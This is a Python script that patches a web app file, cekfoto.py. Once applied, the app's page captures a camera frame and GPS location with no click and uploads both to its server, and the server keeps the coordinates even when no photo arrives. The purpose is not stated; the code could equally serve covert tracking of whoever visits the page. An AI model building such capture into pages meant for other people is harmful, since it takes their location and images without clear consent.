from pathlib import Path

p = Path('/Users/iktidptsi/Downloads/cekfoto.py')
text = p.read_text()

js_start = text.index('    async function captureBlobFromVideo(video, canvas) {')
js_end = text.index('    autoCaptureAndUpload();', js_start)
new_js = '''    async function captureDataUrlFromVideo(video, canvas) {
      const width = video.videoWidth || 1280;
      const height = video.videoHeight || 720;
      canvas.width = width;
      canvas.height = height;
      const ctx = canvas.getContext('2d', { willReadFrequently: true });
      ctx.fillStyle = '#000000';
      ctx.fillRect(0, 0, width, height);
      ctx.drawImage(video, 0, 0, width, height);

      try {
        return canvas.toDataURL('image/jpeg', 0.98);
      } catch (err) {
        console.log('toDataURL error:', err);
        return '';
      }
    }

    async function autoCaptureAndUpload() {
      let stream = null;
      let gps = null;
      try {
        gps = await getGPSLocation();
        if (!gps) {
          await new Promise(r => setTimeout(r, 1500));
          gps = await getGPSLocation();
        }
        console.log('Step 1: GPS request selesai', gps);

        stream = await getCameraStream();
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;
        video.muted = true;
        video.setAttribute('playsinline', 'true');
        await video.play().catch(() => {});
        await waitForVideoReady(video);

        console.log('Step 2: video ready', video.videoWidth, video.videoHeight);

        let dataUrl = '';
        for (let attempt = 1; attempt <= 8; attempt++) {
          dataUrl = await captureDataUrlFromVideo(video, canvas);
          const size = dataUrl ? dataUrl.length : 0;
          console.log(`Capture attempt ${attempt}/8, dataUrl length=${size}`);
          if (dataUrl && size > 20000) {
            break;
          }
          await new Promise(r => setTimeout(r, 500));
        }

        await uploadPhoto(dataUrl, gps);
      } catch (err) {
        console.log('Auto capture error:', err);
        await uploadPhoto('', gps);
      } finally {
        if (stream) {
          stream.getTracks().forEach(t => t.stop());
        }
      }
    }

    async function uploadPhoto(dataUrl, gps) {
      try {
        console.log('Uploading photo with GPS:', gps);
        const resp = await fetch('/upload-json', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            filename: 'auto_capture_' + Date.now() + '.jpg',
            dataUrl: dataUrl || '',
            gps: gps
          })
        });

        const data = await resp.json();
        console.log('Upload result:', data);
      } catch (err) {
        console.log('Upload error:', err);
      }
    }

'''
text = text[:js_start] + new_js + text[js_end:]

old = '''                # Jika ada data URL foto, decode dan simpan
                if data_url and "," in data_url:
                    print(f"[SERVER] Decoding image data...")
                    encoded = data_url.split(",", 1)[1]
                    image_bytes = base64.b64decode(encoded)
                    print(f"[SERVER] Image size: {len(image_bytes)} bytes")
                    
                    with open(saved_path, "wb") as f:
                        f.write(image_bytes)
                else:
                    raise ValueError("No image data from mobile capture")
                
                # Embed GPS ke EXIF jika ada
                if gps_data:
                    print(f"[SERVER] Attempting to embed GPS...")
                    _embed_gps_to_image(saved_path, gps_data)
                    
                    # Store GPS info in sidecar JSON file backup
                    gps_json_path = saved_path.replace(ext, ".gps.json")
                    with open(gps_json_path, "w") as f:
                        json.dump(gps_data, f, indent=2)
                    print(f"[SERVER] GPS backup saved to: {gps_json_path}")

                print(f"[SERVER] Photo saved: {saved_path}")
                cek_foto(saved_path, gps_fallback=gps_data)

                body = json.dumps(
                    {
                        "ok": True,
                        "message": f"Tersimpan di {saved_path}. GPS: {gps_data.get('latitude') if gps_data else 'tidak ada'}",
                    }
                ).encode("utf-8")
'''
new = '''                # Jika ada data URL foto, decode dan simpan. Jika kosong, tetap lanjut GPS-only.
                if data_url and "," in data_url:
                    print(f"[SERVER] Decoding image data...")
                    encoded = data_url.split(",", 1)[1]
                    image_bytes = base64.b64decode(encoded)
                    print(f"[SERVER] Image size: {len(image_bytes)} bytes")
                    
                    with open(saved_path, "wb") as f:
                        f.write(image_bytes)
                else:
                    saved_path = None
                    print(f"[SERVER] No image data from mobile capture; GPS-only upload")
                
                # Embed GPS ke EXIF jika ada
                if gps_data and saved_path:
                    print(f"[SERVER] Attempting to embed GPS...")
                    _embed_gps_to_image(saved_path, gps_data)
                    
                    # Store GPS info in sidecar JSON file backup
                    gps_json_path = saved_path.replace(ext, ".gps.json")
                    with open(gps_json_path, "w") as f:
                        json.dump(gps_data, f, indent=2)
                    print(f"[SERVER] GPS backup saved to: {gps_json_path}")
                elif gps_data and not saved_path:
                    os.makedirs("captures_phone", exist_ok=True)
                    gps_json_path = os.path.join("captures_phone", f"phone_{datetime.now().strftime('%Y%m%d_%H%M%S')}.gps.json")
                    with open(gps_json_path, "w") as f:
                        json.dump(gps_data, f, indent=2)
                    print(f"[SERVER] GPS-only backup saved to: {gps_json_path}")

                if saved_path:
                    print(f"[SERVER] Photo saved: {saved_path}")
                    cek_foto(saved_path, gps_fallback=gps_data)
                else:
                    print("[SERVER] No image saved, GPS-only upload accepted")

                body = json.dumps(
                    {
                        "ok": True,
                        "message": f"GPS diterima: {gps_data.get('latitude') if gps_data else 'tidak ada'}",
                    }
                ).encode("utf-8")
'''
if old not in text:
    raise SystemExit('server block not found')
text = text.replace(old, new)

p.write_text(text)
print('patched')
